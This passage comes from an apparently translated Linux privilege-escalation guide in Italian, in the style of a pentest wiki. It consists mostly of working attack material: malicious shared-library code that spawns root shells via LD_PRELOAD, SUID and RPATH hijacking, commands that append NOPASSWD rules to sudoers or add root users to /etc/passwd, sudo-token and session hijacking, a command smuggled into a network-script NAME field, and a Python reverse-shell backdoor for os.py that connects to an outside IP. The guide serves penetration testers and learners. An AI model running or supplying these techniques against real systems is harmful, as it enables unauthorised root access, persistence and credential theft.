gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Infine, **escalate privileges** eseguendo
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc simile può essere sfruttato se l'attaccante controlla la variabile d'ambiente **LD_LIBRARY_PATH**, perché controlla il percorso in cui verranno cercate le librerie.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Quando ci si imbatte in un binary con permessi **SUID** che sembra insolito, è buona pratica verificare se sta caricando correttamente i file **.so**. È possibile farlo eseguendo il seguente comando:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Ad esempio, incontrare un errore come _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggerisce una potenziale possibilità di exploit.

Per sfruttarla, si può procedere creando un file C, ad esempio _"/path/to/.config/libcalc.c"_, contenente il seguente codice:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Questo codice, una volta compilato ed eseguito, mira a elevare i privilegi manipolando i permessi dei file ed eseguendo una shell con privilegi elevati.

Compila il file C precedente in un file shared object (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Infine, l'esecuzione del binario SUID interessato dovrebbe attivare l'exploit, consentendo una potenziale compromissione del sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ora che abbiamo trovato un binario SUID che carica una libreria da una cartella in cui possiamo scrivere, creiamo la libreria in quella cartella con il nome necessario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se ricevi un errore come
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
ciò significa che la libreria generata deve avere una funzione chiamata `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) è un elenco curato di binari Unix che possono essere sfruttati da un attaccante per aggirare le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è lo stesso, ma per i casi in cui puoi **iniettare solo argomenti** in un comando.

Il progetto raccoglie funzioni legittime dei binari Unix che possono essere abusate per evadere da shell limitate, escalare o mantenere privilegi elevati, trasferire file, avviare bind shell e reverse shell e facilitare le altre attività di post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se puoi accedere a `sudo -l`, puoi usare lo strumento [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) per verificare se riesce a trovare un modo per sfruttare una regola sudo.

### Riutilizzo dei token Sudo

Nei casi in cui hai **accesso a sudo** ma non la password, puoi escalare i privilegi **attendendo l'esecuzione di un comando sudo e quindi hijackando il session token**.<sup>[[18]](#references)</sup>

Requisiti per escalare i privilegi:

- Hai già una shell come utente "_sampleuser_"
- "_sampleuser_" ha **usato `sudo`** per eseguire qualcosa negli **ultimi 15 minuti** (per impostazione predefinita, questa è la durata del token sudo che consente di usare `sudo` senza inserire alcuna password)
- `cat /proc/sys/kernel/yama/ptrace_scope` restituisce 0
- `gdb` è accessibile (devi poterlo caricare)

(Puoi abilitare temporaneamente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` oppure modificarlo permanentemente in `/etc/sysctl.d/10-ptrace.conf` impostando `kernel.yama.ptrace_scope = 0`)

Se tutti questi requisiti sono soddisfatti, **puoi escalare i privilegi usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Il **primo exploit** (`exploit.sh`) creerà il binario `activate_sudo_token` in _/tmp_. Puoi usarlo per **attivare il token sudo nella tua sessione** (non otterrai automaticamente una root shell, esegui `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Il **secondo exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **di proprietà di root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Il **terzo exploit** (`exploit_v3.sh`) **creerà un file sudoers** che rende **eterni i token sudo e consente a tutti gli utenti di usare sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se hai **permessi di scrittura** nella cartella o su uno qualsiasi dei file creati all'interno della cartella, puoi usare il binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) per **creare un sudo token per un utente e un PID**.\
Ad esempio, se puoi sovrascrivere il file _/var/run/sudo/ts/sampleuser_ e hai una shell come quell'utente con PID 1234, puoi **ottenere privilegi sudo** senza dover conoscere la password eseguendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Il file `/etc/sudoers` e i file all'interno di `/etc/sudoers.d` configurano chi può usare `sudo` e come. Questi file **per impostazione predefinita possono essere letti solo dall'utente root e dal gruppo root**.\
**Se** puoi **leggere** questo file, potresti essere in grado di **ottenere informazioni interessanti** e, se puoi **scrivere** qualsiasi file, sarai in grado di **escalare i privilegi**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se puoi scrivere, puoi sfruttare questo permesso
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Un altro modo per sfruttare questi permessi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Esistono alcune alternative al binario `sudo`, come `doas` per OpenBSD; ricordati di controllare la relativa configurazione in `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Se `doas` consente l'uso di un editor o di un interprete, verifica gli escape in stile GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Se sai che un **utente si connette solitamente a una macchina e usa `sudo`** per effettuare una privilege escalation e hai ottenuto una shell nel contesto di quell'utente, puoi **creare un nuovo eseguibile sudo** che eseguirà il tuo codice come root e poi il comando dell'utente. Successivamente, **modifica il `$PATH`** del contesto dell'utente (ad esempio aggiungendo il nuovo path in `.bash_profile`), in modo che quando l'utente esegue sudo venga eseguito il tuo eseguibile sudo.

Nota che, se l'utente utilizza una shell diversa (non bash), dovrai modificare altri file per aggiungere il nuovo path. Ad esempio, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puoi trovare un altro esempio in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oppure eseguendo qualcosa come:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Il file `/etc/ld.so.conf` indica **da dove provengono i file di configurazione caricati**. In genere, questo file contiene il seguente percorso: `include /etc/ld.so.conf.d/*.conf`

Ciò significa che verranno letti i file di configurazione presenti in `/etc/ld.so.conf.d/*.conf`. Questi file di configurazione **rimandano ad altre cartelle** in cui verranno **cercate** le **librerie**. Ad esempio, il contenuto di `/etc/ld.so.conf.d/libc.conf` è `/usr/local/lib`. **Ciò significa che il sistema cercherà le librerie all'interno di `/usr/local/lib`**.

Se per qualche motivo **un utente dispone dei permessi di scrittura** su uno qualsiasi dei percorsi indicati: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualsiasi file all'interno di `/etc/ld.so.conf.d/` o qualsiasi cartella indicata nel file di configurazione all'interno di `/etc/ld.so.conf.d/*.conf`, potrebbe essere in grado di effettuare una privilege escalation.\
Dai un'occhiata a **come sfruttare questa misconfiguration** nella pagina seguente:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Copiando la libreria in `/var/tmp/flag15/`, verrà utilizzata dal programma in questa posizione come specificato nella variabile `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Quindi crea una libreria malevola in `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Funzionalità

Le funzionalità di Linux forniscono a un **processo un sottoinsieme dei privilegi root disponibili**. Questo suddivide effettivamente i **privilegi root in unità più piccole e distinte**. Ognuna di queste unità può quindi essere concessa indipendentemente ai processi. In questo modo, l'insieme completo dei privilegi viene ridotto, diminuendo i rischi di exploitation.\
Leggi la seguente pagina per **saperne di più sulle funzionalità e su come abusarne**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permessi delle directory

In una directory, il **bit per "execute"** implica che l'utente interessato può eseguire "**cd**" nella cartella.\
Il bit **"read"** implica che l'utente può **elencare** i **file**, mentre il bit **"write"** implica che l'utente può **eliminare** e **creare** nuovi **file**.

## ACL

Le Access Control Lists (ACL) rappresentano il livello secondario dei permessi discrezionali, in grado di **sovrascrivere i permessi tradizionali ugo/rwx**. Questi permessi migliorano il controllo sull'accesso a file o directory consentendo o negando i diritti a utenti specifici che non sono i proprietari o che non fanno parte del gruppo. Questo livello di **granularità garantisce una gestione degli accessi più precisa**. Ulteriori dettagli sono disponibili [**qui**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Concedi** all'utente "kali" i permessi di lettura e scrittura su un file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Recupera** file con ACL specifiche dal sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ACL nascosta nei drop-in di sudoers

Una configurazione errata comune è un file di proprietà di root in `/etc/sudoers.d/` con modalità `440` che concede comunque l'accesso in scrittura a un utente con pochi privilegi tramite ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Se vedi qualcosa come `user:alice:rw-`, l'utente può aggiungere una regola sudo nonostante i bit di modalità restrittivi:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Questo è un percorso ad alto impatto per la persistenza/privesc tramite ACL, perché è facile non rilevarlo durante le verifiche basate solo su `ls -l`.

## Sessioni shell aperte

Nelle **vecchie versioni** potresti **hijackare** una sessione **shell** di un altro utente (**root**).\
Nelle **versioni più recenti** potrai **connetterti** alle sessioni screen solo del tuo **utente**. Tuttavia, potresti trovare **informazioni interessanti all'interno della sessione**.

### screen sessions hijacking

**Elenca le sessioni screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![hijacking delle sessioni screen - Posizioni dei socket (alcuni sistemi ne espongono uno come symlink dell'altro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Collegarsi a una sessione**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Hijacking delle sessioni tmux

Questo era un problema delle **vecchie versioni di tmux**. Non sono riuscito a effettuare l'hijacking di una sessione tmux (v2.1) creata da root come utente senza privilegi.

**Elenca le sessioni tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Posizioni dei socket (alcuni sistemi ne espongono uno come symlink dell'altro) - hijacking delle sessioni tmux: tmux -S /tmp/dev sess ls Elenca usando quel socket; puoi avviare una sessione tmux su quel socket...](<../../images/image (837).png>)

**Collegati a una sessione**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Controlla **Valentine box from HTB** per un esempio.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Tutte le chiavi SSL e SSH generate su sistemi basati su Debian (Ubuntu, Kubuntu, ecc.) tra settembre 2006 e il 13 maggio 2008 potrebbero essere interessate da questo bug.\
Questo bug si verifica durante la creazione di una nuova chiave SSH su questi OS, poiché erano possibili **solo 32.768 variazioni**. Ciò significa che tutte le possibilità possono essere calcolate e che, **avendo la chiave pubblica SSH, è possibile cercare la chiave privata corrispondente**. Puoi trovare le possibilità calcolate qui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valori di configurazione interessanti di SSH

- **PasswordAuthentication:** specifica se l'autenticazione tramite password è consentita. Il valore predefinito è `no`.
- **PubkeyAuthentication:** specifica se l'autenticazione tramite chiave pubblica è consentita. Il valore predefinito è `yes`.
- **PermitEmptyPasswords**: quando l'autenticazione tramite password è consentita, specifica se il server permette il login agli account con stringhe di password vuote. Il valore predefinito è `no`.

### File di controllo del login

Questi file influenzano chi può effettuare il login e in che modo:

- **`/etc/nologin`**: se presente, blocca i login non-root e ne stampa il messaggio.
- **`/etc/securetty`**: limita i terminali da cui root può effettuare il login (allowlist dei TTY).
- **`/etc/motd`**: banner visualizzato dopo il login (può fare leak di informazioni sull'ambiente o sulla manutenzione).

### PermitRootLogin

Specifica se root può effettuare il login usando SSH; il valore predefinito è `no`. Valori possibili:

- `yes`: root può effettuare il login usando password e chiave privata
- `without-password` o `prohibit-password`: root può effettuare il login solo con una chiave privata
- `forced-commands-only`: root può effettuare il login solo usando una chiave privata e se sono specificate le opzioni dei comandi
- `no` : no

### AuthorizedKeysFile

Specifica i file che contengono le chiavi pubbliche utilizzabili per l'autenticazione dell'utente. Può contenere token come `%h`, che verranno sostituiti con la directory home. **È possibile indicare percorsi assoluti** (che iniziano con `/`) o **percorsi relativi alla home dell'utente**. Ad esempio:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Quella configurazione indicherà che, se provi a effettuare il **login** con la chiave **privata** dell'utente "**testusername**", ssh confronterà la chiave pubblica della tua chiave con quelle presenti in `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Il forwarding dell'agent SSH consente di **utilizzare le chiavi SSH locali invece di lasciare chiavi** (senza passphrase!) sul server. In questo modo, potrai fare **jump** tramite ssh **verso un host** e da lì fare **jump verso un altro** host **utilizzando** la **chiave** presente nel tuo **host iniziale**.

Devi impostare questa opzione in `$HOME/.ssh.config` in questo modo:
```
Host example.com
ForwardAgent yes
```
Nota che se `Host` è `*`, ogni volta che l'utente passa a un'altra macchina, quell'host sarà in grado di accedere alle chiavi (il che costituisce un problema di sicurezza).

Il file `/etc/ssh_config` può **sovrascrivere queste** **options** e consentire o negare questa configurazione.\
Il file `/etc/sshd_config` può **consentire** o **negare** il forwarding di ssh-agent con la keyword `AllowAgentForwarding` (il valore predefinito è allow).

Se trovi che Forward Agent è configurato in un ambiente, consulta la pagina seguente, poiché **potresti essere in grado di sfruttarlo per effettuare un'escalation dei privilegi**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## File interessanti

### File dei profili

Il file `/etc/profile` e i file presenti in `/etc/profile.d/` sono **script eseguiti quando un utente avvia una nuova shell**. Pertanto, se puoi **scrivere o modificare uno qualsiasi di essi, puoi effettuare un'escalation dei privilegi**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se viene trovato uno script di profilo anomalo, è necessario controllarlo per verificare la presenza di **dettagli sensibili**.

### File Passwd/Shadow

A seconda del sistema operativo, i file `/etc/passwd` e `/etc/shadow` potrebbero avere un nome diverso oppure potrebbe esistere un backup. Pertanto, è consigliato **trovarli tutti** e **verificare se è possibile leggerli** per controllare **se contengono degli hash**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In alcuni casi è possibile trovare gli **hash delle password** all'interno del file `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd scrivibile

Innanzitutto, genera una password con uno dei seguenti comandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Quindi aggiungi l'utente `hacker` e la password generata.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ad es.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ora puoi usare il comando `su` con `hacker:hacker`

In alternativa, puoi usare le righe seguenti per aggiungere un utente fittizio senza password.\
AVVISO: potresti compromettere la sicurezza attuale della macchina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: nelle piattaforme BSD `/etc/passwd` si trova in `/etc/pwd.db` e `/etc/master.passwd`; inoltre, `/etc/shadow` è rinominato in `/etc/spwd.db`.

Dovresti verificare se puoi **scrivere in alcuni file sensibili**. Ad esempio, puoi scrivere in qualche **file di configurazione di un servizio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Ad esempio, se la macchina esegue un server **tomcat** e puoi **modificare il file di configurazione del servizio Tomcat all'interno di /etc/systemd/,** puoi modificare le righe:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
La tua backdoor verrà eseguita la prossima volta che tomcat verrà avviato.

### Controlla le cartelle

Le seguenti cartelle possono contenere backup o informazioni interessanti: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probabilmente non riuscirai a leggere l'ultima, ma prova)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### File di proprietà/in posizioni strane
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### File modificati negli ultimi minuti
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### File DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml file
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### File nascosti
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries nel PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **File web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backup**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### File noti contenenti password

Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): cerca **diversi file potenziali che potrebbero contenere password**.\
**Un altro tool interessante** che puoi utilizzare a questo scopo è: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), un'applicazione open source utilizzata per recuperare numerose password memorizzate su un computer locale con Windows, Linux e Mac.

### Log

Se puoi leggere i log, potresti riuscire a trovare **informazioni interessanti/confidenziali al loro interno**. Più il log è strano, più sarà interessante (probabilmente).\
Inoltre, alcuni **audit log** configurati "male" (con una backdoor?) potrebbero consentirti di **registrare password** negli audit log, come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Per poter **leggere i log, il gruppo** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sarà davvero utile.

### File della shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dovresti anche controllare la presenza di file contenenti la parola "**password**" nel loro **nome** o all'interno del **contenuto**, oltre a verificare la presenza di IP ed email nei log o di regex per gli hash.\
Non elencherò qui come eseguire tutte queste operazioni, ma se ti interessa puoi controllare gli ultimi controlli eseguiti da [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## File scrivibili

### Python library hijacking

Se sai **da dove** verrà eseguito uno script Python e **puoi scrivere all'interno** di quella cartella oppure **modificare le librerie Python**, puoi modificare la libreria del sistema operativo e inserirvi una backdoor (se puoi scrivere nella posizione da cui verrà eseguito lo script Python, copia e incolla la libreria os.py).

Per **inserire una backdoor nella libreria**, aggiungi semplicemente la seguente riga alla fine della libreria os.py (modifica IP e PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Una vulnerabilità in `logrotate` consente agli utenti con **permessi di scrittura** su un file di log o sulle directory che lo contengono di ottenere potenzialmente privilegi elevati. Questo accade perché `logrotate`, spesso eseguito come **root**, può essere manipolato per eseguire file arbitrari, soprattutto in directory come _**/etc/bash_completion.d/**_. È importante verificare i permessi non solo in _/var/log_, ma anche in qualsiasi directory in cui venga applicata la rotazione dei log.

> [!TIP]
> Questa vulnerabilità interessa la versione `3.18.0` e precedenti di `logrotate`

Informazioni più dettagliate sulla vulnerabilità sono disponibili in questa pagina: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Puoi sfruttare questa vulnerabilità con [**logrotten**](https://github.com/whotwagner/logrotten).

Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**, quindi ogni volta che scopri di poter modificare i log, verifica chi li gestisce e controlla se puoi ottenere l'escalation dei privilegi sostituendo i log con symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Riferimento della vulnerabilità:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Se, per qualsiasi motivo, un utente è in grado di **scrivere** uno script `ifcf-<whatever>` in _/etc/sysconfig/network-scripts_ **oppure** di **modificare** uno script esistente, allora il **sistema è pwned**.<sup>[[20]](#references)</sup>

Gli script di rete, ad esempio _ifcg-eth0_, vengono utilizzati per le connessioni di rete. Sono esattamente come i file .INI. Tuttavia, su Linux vengono \~sourced\~ da Network Manager (dispatcher.d).

Nel mio caso, l'attributo `NAME=` in questi script di rete non viene gestito correttamente. Se nel nome è presente uno **spazio bianco/vuoto, il sistema tenta di eseguire la parte successiva allo spazio bianco/vuoto**. Ciò significa che **tutto ciò che segue il primo spazio vuoto viene eseguito come root**.

Ad esempio: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota lo spazio vuoto tra Network e /bin/id_)

### **init, init.d, systemd e rc.d**

La directory `/etc/init.d` contiene **script** per System V init (SysVinit), il **classico sistema Linux di gestione dei servizi**. Include script per `start`, `stop`, `restart` e talvolta `reload` dei servizi. Questi possono essere eseguiti direttamente o tramite link simbolici presenti in `/etc/rc?.d/`. Un percorso alternativo nei sistemi Redhat è `/etc/rc.d/init.d`.

D'altra parte, `/etc/init` è associata a **Upstart**, un sistema più recente di **gestione dei servizi** introdotto da Ubuntu, che utilizza file di configurazione per le attività di gestione dei servizi. Nonostante la transizione a Upstart, gli script SysVinit vengono ancora utilizzati insieme alle configurazioni Upstart grazie a un livello di compatibilità in Upstart.

**systemd** emerge come un moderno gestore dell'inizializzazione e dei servizi, offrendo funzionalità avanzate come l'avvio on-demand dei daemon, la gestione degli automount e gli snapshot dello stato del sistema. Organizza i file in `/usr/lib/systemd/` per i pacchetti della distribuzione e in `/etc/systemd/system/` per le modifiche degli amministratori, semplificando il processo di amministrazione del sistema.<sup>[[21]](#references)</sup>

## Altri trucchi

### Privilege escalation tramite NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escape da restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Gli Android rooting frameworks effettuano comunemente l'hook di una syscall per esporre funzionalità privilegiate del kernel a un manager in userspace. Un'autenticazione debole del manager (ad esempio, signature check basati sull'ordine degli FD o schemi di password inadeguati) può consentire a un'app locale di impersonare il manager ed effettuare privilege escalation a root su dispositivi già sottoposti a rooting. Maggiori informazioni e dettagli sull'exploitation sono disponibili qui:


{{#ref}}
